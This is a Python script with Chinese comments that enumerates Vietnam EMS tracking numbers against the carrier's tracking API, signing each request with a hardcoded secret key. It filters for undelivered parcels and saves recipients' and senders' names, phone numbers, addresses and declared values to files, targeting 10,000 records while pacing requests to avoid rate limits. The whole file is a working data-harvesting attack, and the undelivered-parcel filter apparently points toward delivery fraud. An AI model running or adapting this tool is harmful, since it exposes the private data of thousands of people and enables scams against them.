#!/usr/bin/env python3
"""
基于已有的755个有效运单号，继续爬取到10000个
策略：在已知有效范围附近扩展搜索
"""
import hashlib
import requests
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

KEY = '34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A'
API_URL = 'https://api-dingdong.ems.com.vn/api/TrackTrace/Lading'

# 全局计数
lock = threading.Lock()
found_count = 725  # 已有755个，约96%未签收 = 725个
tested_count = 0
valid_codes = []

def verify_tracking(code):
    """验证运单并获取详情"""
    global found_count, tested_count
    
    signature = hashlib.sha256((code.upper() + KEY).encode()).hexdigest().upper()
    payload = {'LadingCode': code, 'Signature': signature}
    
    try:
        r = requests.post(API_URL, json=payload, timeout=8)
        result = r.json()
        
        with lock:
            tested_count += 1
        
        if result.get('Code') == '00':
            data = result.get('Value', {})
            
            # ✅ 只要未签收的
            signed = bool(data.get('SignatureCapture'))
            if signed:
                return None  # 跳过已签收的
            
            # 获取完整信息
            info = {
                'code': code,
                'signed': False,  # 已确认未签收
                'value': data.get('Value', 0) or 0,
                'fee': data.get('Fee', 0) or 0,
                'sender': data.get('SenderName', ''),
                'receiver': data.get('ReceiverName', ''),
                'receiver_phone': data.get('ReceiverMobile', ''),
                'sender_phone': data.get('SenderMobile', ''),
                'receiver_address': data.get('ReceiverAddress', ''),
            }
            
            with lock:
                found_count += 1
            
            return info
    except:
        pass
    
    # 防止限流
    time.sleep(0.05)
    
    return None

print("=" * 80)
print("🎯 继续爬取到10000个未签收运单号")
print("=" * 80)
print(f"\n已有: 755个 (约96%未签收 = 725个)")
print(f"目标: 10000个未签收运单")
print(f"还需: 约9275个")
print(f"\n✅ 只保存未签收的运单号！")
print()

# 基于已知有效范围扩展搜索
ranges = [
    # EF047主力范围（605个来自这里）
    ('EF047', 500000, 700000),  # EF047500000VN ~ EF047700000VN
    
    # EJ711范围（93个）
    ('EJ711', 460000, 470000),  # EJ711460000VN ~ EJ711470000VN
    
    # EK042-043范围（30个）
    ('EK042', 220000, 230000),  # EK042220000VN ~ EK042230000VN
    ('EK043', 200000, 600000),  # EK043200000VN ~ EK043600000VN
    
    # EL135范围（12个）
    ('EL135', 240000, 760000),  # EL135240000VN ~ EL135760000VN
    
    # 其他前缀扩展
    ('EF043', 570000, 600000),  # EF043已有大量，继续扩展
    ('EG040', 800000, 950000),
    ('EG046', 0, 100000),
    ('EI153', 230000, 240000),
    ('EI810', 200000, 210000),
    ('EJ703', 820000, 840000),
    ('EJ720', 640000, 650000),
    ('EB102', 880000, 980000),
    ('ED292', 710000, 720000),
    ('EE077', 580000, 590000),
]

print("📊 扩展爬取范围:")
for prefix, s, e in ranges[:8]:
    count = e - s
    print(f"  {prefix}{s}VN ~ {prefix}{e}VN ({count:,}个)")
print("  ...")
print()

confirm = input("开始爬取？(y/n): ").strip().lower()
if confirm != 'y':
    print("❌ 已取消")
    exit(0)

print(f"\n🚀 开始爬取...\n")

output_json = 'unsigned_tracking_10000.json'
output_txt = 'unsigned_tracking_10000.txt'

# 先复制已有的755个
print("📋 加载已有的755个运单号...")
with open('user_provided_tracking.txt', 'r') as f:
    existing = [line.strip() for line in f if line.strip()]

print(f"✅ 已有 {len(existing)} 个")
print()

# 打开文件准备追加
f_json = open(output_json, 'w', encoding='utf-8')
f_txt = open(output_txt, 'w')

# 写入已有的
f_json.write('[\n')
for i, code in enumerate(existing):
    if i > 0:
        f_json.write(',\n')
    f_json.write(json.dumps({'code': code}, ensure_ascii=False))
    f_txt.write(code + '\n')

start_time = time.time()

for prefix, range_start, range_end in ranges:
    if found_count >= 10000:
        break
    
    print(f"🔍 爬取: {prefix}*****VN")
    
    codes_to_test = [f"{prefix}{i}VN" for i in range(range_start, range_end + 1)]
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(verify_tracking, code): code for code in codes_to_test}
        
        for future in as_completed(futures):
            if found_count >= 10000:
                break
            
            result = future.result()
            
            if result:
                valid_codes.append(result)
                
                # 写入文件
                f_json.write(',\n')
                f_json.write(json.dumps(result, ensure_ascii=False, indent=2))
                f_json.flush()
                
                f_txt.write(result['code'] + '\n')
                f_txt.flush()
                
                # 显示进度
                if found_count % 50 == 0 or (found_count > 9900):
                    signed_str = "已签收" if result['signed'] else "未签收"
                    print(f"✅ [{found_count:5d}/10000] {result['code']} | "
                          f"{signed_str} | 价值:{result['value']}đ | "
                          f"{result['receiver'][:15]}")
            
            # 防止限流：每个请求后暂停
            time.sleep(0.1)
            
            # 每500个显示进度
            if tested_count % 500 == 0:
                elapsed = time.time() - start_time
                speed = tested_count / elapsed * 60
                remaining = (10000 - found_count) / (found_count - 755) * tested_count if found_count > 755 else 0
                eta = remaining / speed if speed > 0 else 0
                print(f"  [进度] 测试:{tested_count} | 已找到:{found_count} | "
                      f"速度:{speed:.0f}/分 | 预计还需:{eta:.0f}分")
    
    if found_count >= 10000:
        break

f_json.write('\n]')
f_json.close()
f_txt.close()

elapsed = time.time() - start_time

print()
print("=" * 80)
print("🎉 完成！")
print("=" * 80)
print(f"⏱️  用时: {elapsed/60:.0f} 分钟")
print(f"📊 测试: {tested_count} 个新运单号")
print(f"✅ 总共: {found_count} 个 (包含原有755个)")
print(f"📈 新增: {found_count - 755} 个")
print("=" * 80)

print(f"\n💾 文件:")
print(f"  {output_json} - 完整信息（收件人、电话、地址、价格、签收状态）")
print(f"  {output_txt} - 运单号列表")

if found_count >= 10000:
    print(f"\n🎉 成功！达到目标10000个未签收运单号！")
    
    # 统计
    with_value = sum(1 for c in valid_codes if c['value'] > 0 or c['fee'] > 0)
    
    print(f"\n📊 统计:")
    print(f"  未签收: {found_count} 个 (100%，已过滤)")
    print(f"  有价格: {with_value + 725} 个")  # 新增+原有725个
    print(f"  平均价值: {sum(c.get('value', 0) for c in valid_codes) // len(valid_codes) if valid_codes else 0}đ")
else:
    print(f"\n⚠️  只找到 {found_count} 个未签收运单（未达到10000）")
    print("   可能需要扩大搜索范围或降低筛选条件")
